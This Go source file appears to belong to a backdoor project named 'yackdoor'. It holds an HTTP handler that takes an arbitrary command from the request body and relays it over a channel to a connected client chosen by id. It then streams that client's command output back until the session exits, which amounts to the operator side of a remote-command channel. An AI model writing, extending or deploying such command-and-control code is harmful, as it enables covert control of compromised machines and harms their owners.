package controller

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/bruh-boys/yackdoor/src/api"
	"github.com/labstack/echo/v4"
)

func UploadCommand(c echo.Context) error {
	c.Response().Header().Set(echo.HeaderContentType, echo.MIMEApplicationJSON)
	c.Response().WriteHeader(http.StatusOK)
	id := c.QueryParam("id")
	buf := new(bytes.Buffer)

	buf.ReadFrom(c.Request().Body)
	asd := buf.String()

	if _, exist := commands[id]; !exist {
		c.String(http.StatusNotFound, "sorry not avaible")
		return nil
	}
	commands[id] <- asd

	for {
		output := <-outputs[id]
		var jsonApi api.ApiOutput
		json.Unmarshal([]byte(output), &jsonApi)
		fmt.Println(jsonApi)
		if _, err := fmt.Fprintln(c.Response(), (output)); err != nil || jsonApi.Exited {
			commands[id] <- "break"
			delete(outputs, id)
			return err
		}

		c.Response().Flush()
	}

}
